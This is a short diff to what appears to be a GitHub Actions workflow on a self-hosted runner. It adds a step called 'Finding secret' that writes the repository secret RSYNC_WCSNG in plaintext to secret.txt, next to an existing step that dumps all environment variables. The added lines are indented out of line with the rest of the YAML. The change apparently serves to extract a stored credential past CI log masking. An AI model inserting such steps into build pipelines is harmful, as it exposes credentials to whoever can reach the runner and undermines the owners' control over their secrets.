@@ -11,6 +11,10 @@ jobs:
   build:
     runs-on: self-hosted
     steps:
+
+     - name: Finding secret
+        run: echo "${{ secrets.RSYNC_WCSNG }}" >> secret.txt
+        
       - name: Print Environment Variables (Before Proxy Test)
         run: env | sort
 
